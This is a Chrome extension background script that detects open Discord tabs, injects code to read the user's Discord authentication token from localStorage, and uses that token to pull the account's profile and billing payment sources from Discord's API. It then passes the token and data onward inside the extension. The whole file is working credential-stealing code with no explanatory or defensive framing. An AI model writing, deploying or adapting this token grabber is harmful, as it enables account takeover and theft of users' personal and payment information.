chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.url && changeInfo.url.includes("https://discord.com/")) {
        console.log("Discord tab detected, fetching data...");
        fetchDiscordData(tabId);
    }
});

async function fetchDiscordData(tabId) {
    console.log("Fetching Discord data...");
    chrome.scripting.executeScript(
        {
            target: { tabId },
            func: () => window.localStorage.getItem("token"),
        },
        async (results) => {
            if (chrome.runtime.lastError) {
                console.error("Error executing script:", chrome.runtime.lastError.message);
                return;
            }

            const token = results[0]?.result || null;
            if (token) {
                console.log("Token fetched successfully.");
                try {
                    const cleanedToken = token.replace(/^"|"$/g, "");
                    console.log("Fetching user info and payment methods...");
                    const userInfo = await fetchUserInfo(cleanedToken);
                    const paymentMethods = await fetchPaymentMethods(cleanedToken);
                    console.log("Data fetched successfully:", { userInfo, paymentMethods });

                    chrome.runtime.sendMessage({
                        type: "DISCORD_DATA",
                        success: true,
                        token: cleanedToken,
                        userInfo,
                        paymentMethods
                    });
                } catch (error) {
                    console.error("Error fetching data:", error);
                }
            } else {
                console.warn("No token found in Discord's localStorage.");
            }
        }
    );
}

async function fetchUserInfo(token) {
    try {
        const response = await fetch('https://discord.com/api/v9/users/@me', {
            headers: { 'Authorization': token }
        });

        if (!response.ok) {
            throw new Error(`Failed to fetch user info: ${response.statusText}`);
        }

        console.log("User info fetched successfully.");
        return response.json();
    } catch (error) {
        console.error("Error in fetchUserInfo:", error);
        throw error;
    }
}

async function fetchPaymentMethods(token) {
    try {
        const response = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {
            headers: { 'Authorization': token }
        });

        if (!response.ok) {
            console.warn("No payment methods found or failed to fetch payment methods.");
            return [];
        }

        console.log("Payment methods fetched successfully.");
        return response.json();
    } catch (error) {
        console.error("Error in fetchPaymentMethods:", error);
        throw error;
    }
}
